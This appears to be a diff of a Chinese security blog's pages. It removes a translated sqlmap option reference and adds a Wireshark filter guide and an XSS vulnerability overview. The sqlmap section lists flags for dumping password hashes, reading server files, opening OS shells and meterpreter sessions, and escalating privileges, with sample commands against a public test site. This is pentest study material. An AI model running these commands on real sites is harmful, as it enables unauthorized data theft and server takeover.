-<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	sqlmap详细命令：
-</h2>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--is-dba 当前用户权限（是否为root权限）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dbs 所有数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--current-db 网站当前数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--users 所有数据库用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--current-user 当前数据库用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--random-agent 构造随机user-agent
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--passwords 数据库密码
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
-	</li>
-</ul>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	——————————————————————————————————
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Options（选项）：
-</h3>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--version 显示程序的版本号并退出
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-h, --help 显示此帮助消息并退出
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-v VERBOSE 详细级别：0-6（默认为1）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		保存进度继续跑：
-	</li>
-</ul>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br style="color:#444444;" />
-<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span>
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Target（目标）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	以下至少需要设置其中一个选项，设置目标URL。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-d DIRECT 直接连接到数据库。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-u URL, --url=URL 目标URL。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-l LIST 从Burp或WebScarab代理的日志中解析目标。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-r REQUESTFILE 从一个文件中载入HTTP请求。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-g GOOGLEDORK 处理Google dork的结果作为目标URL。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-c CONFIGFILE 从INI配置文件中加载选项。
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Request（请求）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来指定如何连接到目标URL。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--data=DATA 通过POST发送的数据字符串
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--cookie=COOKIE HTTP Cookie头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--cookie-urlencode URL 编码生成的cookie注入
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--drop-set-cookie 忽略响应的Set - Cookie头信息
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--user-agent=AGENT 指定 HTTP User - Agent头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--random-agent 使用随机选定的HTTP User - Agent头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--referer=REFERER 指定 HTTP Referer头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--headers=HEADERS 换行分开，加入其他的HTTP头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--auth-cert=ACERT HTTP认证证书（key_file，cert_file）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--proxy=PROXY 使用HTTP代理连接到目标URL
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--ignore-proxy 忽略系统默认的HTTP代理
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--retries=RETRIES 连接超时后重新连接的时间（默认3）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--safe-url=SAFURL 在测试过程中经常访问的url地址
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Enumeration（枚举）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br />
-您自己的SQL语句。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-b, --banner 检索数据库管理系统的标识
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--current-user 检索数据库管理系统当前用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--current-db 检索数据库管理系统当前数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--is-dba 检测DBMS当前用户是否DBA
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--users 枚举数据库管理系统用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--passwords 枚举数据库管理系统用户密码哈希
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--privileges 枚举数据库管理系统用户的权限
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--roles 枚举数据库管理系统用户的角色
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dbs 枚举数据库管理系统数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-D DBname 要进行枚举的指定数据库名
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--tables 枚举的DBMS数据库中的表
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--columns 枚举DBMS数据库表列
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dump 转储数据库管理系统的数据库中的表项
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dump-all 转储所有的DBMS数据库表中的条目
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--search 搜索列（S），表（S）和/或数据库名称（S）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-C COL 要进行枚举的数据库列
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-U USER 用来进行枚举的数据库用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--exclude-sysdbs 枚举表时排除系统数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--start=LIMITSTART 第一个查询输出进入检索
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--stop=LIMITSTOP 最后查询的输出进入检索
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--first=FIRSTCHAR 第一个查询输出字的字符检索
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--last=LASTCHAR 最后查询的输出字字符检索
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--sql-query=QUERY 要执行的SQL语句
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--sql-shell 提示交互式SQL的shell
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Optimization（优化）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可用于优化SqlMap的性能。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-o 开启所有优化开关
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--predict-output 预测常见的查询输出
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--keep-alive 使用持久的HTTP（S）连接
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--null-connection 从没有实际的HTTP响应体中检索页面长度
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Injection（注入）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-p TESTPARAMETER 可测试的参数（S）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dbms=DBMS 强制后端的DBMS为此值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os=OS 强制后端的DBMS操作系统为这个值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--prefix=PREFIX 注入payload字符串前缀
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--suffix=SUFFIX 注入payload字符串后缀
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--tamper=TAMPER 使用给定的脚本（S）篡改注入数据
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Detection（检测）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--level=LEVEL 执行测试的等级（1-5，默认为1）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--risk=RISK 执行测试的风险（0-3，默认为1）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--string=STRING 查询时有效时在页面匹配字符串
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--regexp=REGEXP 查询时有效时在页面匹配正则表达式
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--text-only 仅基于在文本内容比较网页
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Techniques（技巧）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可用于调整具体的SQL注入测试。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--technique=TECH SQL注入技术测试（默认BEUST）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--union-cols=UCOLS 定列范围用于测试UNION查询注入
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--union-char=UCHAR 用于暴力猜解列数的字符
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Fingerprint（指纹）：
-</h3>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-f, --fingerprint 执行检查广泛的DBMS版本指纹
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Brute force（蛮力）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以被用来运行蛮力检查。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--common-tables 检查存在共同表
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--common-columns 检查存在共同列
-	</li>
-</ul>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	User-defined function injection（用户自定义函数注入）：<br />
-这些选项可以用来创建用户自定义函数。
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	--udf-inject 注入用户自定义函数<br />
---shared-lib=SHLIB 共享库的本地路径
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	File system access（访问文件系统）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以被用来访问后端数据库管理系统的底层文件系统。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Operating system access（操作系统访问）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用于访问后端数据库管理系统的底层操作系统。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-cmd=OSCMD 执行操作系统命令
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-shell 交互式的操作系统的shell
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-pwn 获取一个OOB shell，meterpreter或VNC
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-bof 存储过程缓冲区溢出利用
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--priv-esc 数据库进程用户权限提升
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--msf-path=MSFPATH Metasploit Framework本地的安装路径
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--tmp-path=TMPPATH 远程临时文件目录的绝对路径
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Windows注册表访问：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以被用来访问后端数据库管理系统Windows注册表。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-read 读一个Windows注册表项值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-add 写一个Windows注册表项值数据
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-del 删除Windows注册表键值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-key=REGKEY Windows注册表键
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-value=REGVAL Windows注册表项值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-data=REGDATA Windows注册表键值数据
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-type=REGTYPE Windows注册表项值类型
-	</li>
-</ul>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来设置一些一般的工作参数。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-s SESSIONFILE 保存和恢复检索会话文件的所有数据
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--flush-session 刷新当前目标的会话文件
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--fresh-queries 忽略在会话文件中存储的查询结果
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--eta 显示每个输出的预计到达时间
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--update 更新SqlMap
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--save file保存选项到INI配置文件
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--batch 从不询问用户输入，使用所有默认配置。
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Miscellaneous（杂项）：
-</h3>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--beep 发现SQL注入时提醒
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--check-payload IDS对注入payloads的检测测试
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--cleanup SqlMap具体的UDF和表清理DBMS
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--forms 对目标URL的解析和测试形式
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--page-rank Google dork结果显示网页排名（PR）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--parse-errors 从响应页面解析数据库管理系统的错误消息
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--replicate 复制转储的数据到一个sqlite3数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--wizard 给初级用户的简单向导界面
-	</li>
-</ul>
-
-<p>
-	sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1
-</p>
-<p>
-	sqlmap-master\sqlmap.py -u &nbsp;"http://www.ddd.com/index?d=55" --batch --banner
-</p>
-
-
-
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
+            <p>Wireshark是非常流行的网络封包分析软件，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程各种问题定位 </p>
+<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="过滤条件-input"><a href="#过滤条件-input" class="headerlink" title="过滤条件 input"></a>过滤条件 input</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## No. ：包的编号 ————————————默认wireshark是按照数据包编号从低到高排序，该编号不会发生改变，即使使用了过滤也同样如此</span></span><br><span class="line"><span class="comment">## Time：包的时间戳。时间格式可以自己设置</span></span><br><span class="line"><span class="comment">## Source 和Destination ：包的源地址和目的地址</span></span><br><span class="line"><span class="comment">## Protocol：包的协议类型</span></span><br><span class="line"><span class="comment">## Length：包的长度</span></span><br><span class="line"><span class="comment">## Info：包的附加信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ip过滤 ###</span></span><br><span class="line"><span class="comment">## 关于 192.168.9.167</span></span><br><span class="line">ip.addr == 192.168.9.167</span><br><span class="line"></span><br><span class="line"><span class="comment">## 请求 192.168.9.167 或者 被请求体 17.248.216.65</span></span><br><span class="line">ip.src == 192.168.9.167 or ip.dst == 17.248.216.65</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 握手包 ###</span></span><br><span class="line"><span class="comment"># SYN：Synchronize，用于初始化和建立连接，它同时也用于同步设备之间的序列号（Seq）</span></span><br><span class="line"><span class="comment"># ACK：Acknolowege，向另一方确认它已收到SYN</span></span><br><span class="line"><span class="comment"># Seq：Sequence number，序列号，用于表示曾经发送过数据的字节数+1</span></span><br><span class="line"><span class="comment"># Len：用于表示收到的字节大小，0表示本次没有收到数据</span></span><br><span class="line"><span class="comment"># FIN：用于结束连接</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2133420">https://cloud.tencent.com/developer/article/2133420</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zichliang/p/17477251.html">https://www.cnblogs.com/zichliang/p/17477251.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linyfeng/p/9496126.html">https://www.cnblogs.com/linyfeng/p/9496126.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/sectool/433570.html">https://www.freebuf.com/articles/sectool/433570.html</a></p>
 
         </div>
     
@@ -1332,8 +601,8 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/19/stock/">
-                股市币市
+            <a href="/2026/09/19/xss/">
+                XSS跨站脚本攻击
             </a>
         </h1>
         <div class="post-info">
@@ -1343,7 +612,7 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
             
             
                 <span class="category">
-                    <a href="/categories/新/">新</a>
+                    <a href="/categories/渗透/">渗透</a>
                 </span>
             
         </div>
@@ -1351,24 +620,31 @@ sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\in
 
     
         <div class="content">
-            <p>本金 </p>
-<p>三折最多</p>
-<p>三折以上就是突发状况</p>
-<p>有信心可以all in 30%</p>
-<pre><code>信心一般可以先 20%
-</code></pre>
-<p>小试牛刀 10% </p>
-<pre><code>补刀 10%
-
-    收回本金 cl 1
-    或者收回补刀的钱 cl 2
-
-开始做空
-</code></pre>
-<p>一定要留补仓 40%</p>
-<p>本金越大 补仓率就要增高</p>
-<p>2&#x2F;24</p>
-<p>2684 200</p>
+            <h1 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h1><p>XSS属于客户端攻击，受害者最终是用户，但特别要注意的是网站管理人员也属于用户之一。这就意味着XSS可以进行“服务端”攻击，因为管理员要比普通用户的权限大得多，一般管理员都可以对网站进行文件管理，数据管理等操作，而攻击者一般也是靠管理员身份作为“跳板”进行实施攻击。</p>
+<blockquote>
+<p>XSS的重点不在于跨站点，而在于脚本的执行。那么XSS的原理是：<br>恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。那么XSS攻击最主要有如下分类：反射型、存储型、及 DOM-based型。 反射性和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。</p>
+</blockquote>
+<ol>
+<li>XSS漏洞出现的原因</li>
+</ol>
+<p>程序对输入和输出的控制不够严格,导致”精心构造“的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害。</p>
+<ol start="2">
+<li>XSS的分类</li>
+</ol>
+<ul>
+<li>反射型XSS或不持久型XSS(中危)</li>
+<li>储存型XSS 或持久型 XSS（高危）</li>
+<li>DOM XSS</li>
+</ul>
+<ol start="3">
+<li>测试方法<br>1、工具扫描：APPscan、AWVS</li>
+</ol>
+<p>2、手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF</p>
+<p>使用手工检测Web应用程序是否存在XSS漏洞时，最重要的是考虑那里有输入，输入的数据在什么地方输出。在进行手工检测XSS时，人毕竟不像软件那样不知疲惫，所以一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS。</p>
